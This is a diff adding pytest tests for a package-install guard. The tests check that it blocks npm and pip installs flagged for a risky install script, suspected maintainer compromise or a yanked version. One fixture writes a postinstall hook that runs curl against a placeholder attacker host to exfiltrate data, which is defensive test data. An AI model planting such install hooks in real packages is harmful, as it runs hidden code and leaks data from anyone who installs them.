@@ -1,0 +1,115 @@
+"""Phase 04 install-time evaluator reason proofs (SCSR066-SCSR070)."""
+
+from __future__ import annotations
+
+from pathlib import Path
+
+import pytest
+
+from codex_plugin_scanner.guard.local_supply_chain import evaluate_package_request_artifact
+from codex_plugin_scanner.guard.store import GuardStore
+from tests.guard_python_phase12_support import (
+    WORKSPACE_ID as PYTHON_WORKSPACE_ID,
+)
+from tests.guard_python_phase12_support import (
+    artifact_from_command_fixture,
+    bundle_response_fixture,
+    package_fixture,
+)
+from tests.native_workspace import bind_workspace
+from tests.test_guard_js_supply_chain_phase11 import WORKSPACE_ID, _artifact_from_command, _bundle_response, _write_text
+
+pytestmark = pytest.mark.usefixtures("package_intent_native")
+
+
+def test_install_lifecycle_script_risk_blocks_local_package(tmp_path: Path) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "fixtures" / "evil-package" / "package.json",
+        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
+    )
+    store = GuardStore(home_dir)
+
+    artifact = _artifact_from_command("npm install ./fixtures/evil-package", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["reasons"][0]["code"] == "install_script_risk"
+
+
+def test_maintainer_compromise_reason_blocks_high_risk_package(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(
+            packages=[
+                {
+                    "confidence": 990,
+                    "defaultAction": "block",
+                    "ecosystem": "npm",
+                    "exploitLevel": "elevated",
+                    "knownExploited": False,
+                    "malwareState": "suspected",
+                    "name": "trusted-build-tools",
+                    "normalizedSeverity": "high",
+                    "packageAgeState": "watch",
+                    "purl": "pkg:npm/trusted-build-tools@5.4.0",
+                    "reachability": "reachable",
+                    "recommendedFixVersion": None,
+                    "relatedAdvisoryIds": ["GHSA-maintainer-risk"],
+                    "riskScore": 930,
+                    "sourceIntegrityState": "high-risk",
+                    "version": "5.4.0",
+                }
+            ]
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm install trusted-build-tools@5.4.0", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert any(reason["code"] == "maintainer_compromise" for reason in result.reasons)
+
+
+def test_yanked_release_blocks_requested_python_version_with_safer_fix_copy(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    store = GuardStore(home_dir)
+    bind_workspace(store, PYTHON_WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        PYTHON_WORKSPACE_ID,
+        bundle_response_fixture(
+            packages=[
+                package_fixture(
+                    name="urllib3",
+                    version="2.0.0",
+                    default_action="block",
+                    recommended_fix_version="2.0.7",
+                )
+            ]
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = artifact_from_command_fixture("pip install urllib3==2.0.0", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.user_copy.next_step == "pip install urllib3==2.0.7"
+    assert "pip install urllib3==2.0.7" in result.user_copy.harness_message
